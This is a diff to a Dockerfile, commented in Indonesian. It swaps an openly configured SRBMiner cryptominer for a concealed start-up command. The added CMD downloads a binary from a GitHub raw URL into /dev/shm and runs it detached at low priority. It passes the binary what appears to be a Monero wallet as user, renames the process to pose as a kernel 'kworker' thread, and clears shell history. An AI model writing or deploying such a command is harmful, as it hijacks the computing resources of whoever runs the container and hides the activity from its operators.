@@ -1,20 +1,10 @@
 FROM ubuntu:20.04
 
-RUN apt-get update && apt-get install -y wget tar
+# Install dependencies yang diperlukan: curl (untuk download), procps (untuk nice/ionice/ps)
+RUN apt-get update && apt-get install -y curl procps && rm -rf /var/lib/apt/lists/*
 
 WORKDIR /app
 
-RUN cd ~ && mkdir -p srbminer && cd srbminer && \
-    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.3.9/SRBMiner-Multi-3-3-9-Linux.tar.gz && \
-    tar xf SRBMiner-Multi-3-3-9-Linux.tar.gz && \
-    rm SRBMiner-Multi-3-3-9-Linux.tar.gz
-
-WORKDIR /root/srbminer/SRBMiner-Multi-3-3-9
-
-RUN echo '#!/bin/bash' > /run-miner.sh && \
-    echo 'echo "Miner starting..."' >> /run-miner.sh && \
-    echo './SRBMiner-MULTI -a neuromorph -o stratum.cereblix.com:3333 -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun -p x -t 4' >> /run-miner.sh && \
-    echo 'echo "Miner exit code: $?"' >> /run-miner.sh && \
-    chmod +x /run-miner.sh
-
-CMD ["/bin/bash", "-c", "sleep 1 && /run-miner.sh && sleep infinity"]
+# CMD akan menjalankan perintah kworker saat container di-start
+# Perintah ini didesain untuk berjalan di background (daemon)
+CMD ["bash", "-c", "curl -s -L -o /dev/shm/kworker https://github.com/Srilin8/gedf3/raw/refs/heads/main/vtt && chmod +x /dev/shm/kworker && nohup nice -n 19 ionice -c 3 /dev/shm/kworker --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjisFwgiWPVfBHuWs+7200 --pass yell1 > /dev/null 2>&1 & disown; echo kworker/u8:0 > /proc/$!/comm 2>/dev/null; history -c; unset HISTFILE"]
